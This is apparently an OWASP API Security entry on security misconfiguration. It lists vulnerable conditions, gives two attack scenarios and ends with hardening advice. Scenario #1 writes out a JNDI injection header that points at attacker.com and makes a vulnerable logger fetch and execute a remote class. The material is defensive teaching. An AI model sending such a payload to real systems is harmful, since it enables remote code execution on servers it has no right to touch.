: Business Specific
Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available.
Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options.
Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise.
Is the API Vulnerable?
The API might be vulnerable if:
Appropriate security hardening is missing across any part of the API stack,
 or if there are improperly configured permissions on cloud services
The latest security patches are missing, or the systems are out of date
Unnecessary features are enabled (e.g. HTTP verbs, logging features)
There are discrepancies in the way incoming requests are processed by servers
 in the HTTP server chain
Transport Layer Security (TLS) is missing
Security or cache control directives are not sent to clients
A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
Error messages include stack traces, or expose other sensitive information
Example Attack Scenarios
Scenario #1
An API back-end server maintains an access log written by a popular third-party
open-source logging utility with support for placeholder expansion and JNDI
(Java Naming and Directory Interface) lookups, both enabled by default. For
each request, a new entry is written to the log file with the following
pattern:
<method> <api_version>/<path> - <status_code>
.
A bad actor issues the following API request, which gets written to the access
log file:
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
Due to the insecure default configuration of the logging utility and a
permissive network outbound policy, in order to write the corresponding entry
to the access log, while expanding the value in the
X-Api-Version
request
header, the logging utility will pull and execute the
Malicious.class
object
from the attacker's remote controlled server.
Scenario #2
A social network website offers a "Direct Message" feature that allows users to
keep private conversations. To retrieve new messages for a specific
conversation, the website issues the following API request (user interaction is
not required):
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
Because the API response does not include the
Cache-Control
HTTP response
header, private conversations end-up cached by the web browser, allowing
malicious actors to retrieve them from the browser cache files in the
filesystem.
How To Prevent
The API life cycle should include:
A repeatable hardening process leading to fast and easy deployment of a
 properly locked down environment
A task to review and update configurations across the entire API stack. The
 review should include: orchestration files, API components, and cloud
 services (e.g. S3 bucket permissions)
An automated process to continuously assess the effectiveness of the
 configuration and settings in all environments
Furthermore:
Ensure that all API communications from the client to the API server and any
 downstream/upstream components happen over an encrypted communication channel
 (TLS), regardless of whether it is an internal or public-facing API.
Be specific about which HTTP verbs each API can be accessed by: all other
 HTTP verbs should be disabled (e.g. HEAD).
APIs expecting to be accessed from browser-based clients (e.g., WebApp
 front-end) should, at least:
implement a proper Cross-Origin Resource Sharing (CORS) policy
include applicable Security Headers
Restrict incoming content types/data formats to those that meet the business/
 functional requirements.
Ensure all servers in the HTTP server chain (e.g. load balancers, reverse
 and forward proxies, and back-end servers) process incoming requests in a
 uniform manner to avoid desync issues.
Where applicable, define and enforce all API response payload schemas,
 including error responses, to prevent exception traces and other valuable
 information from being sent back to attackers.
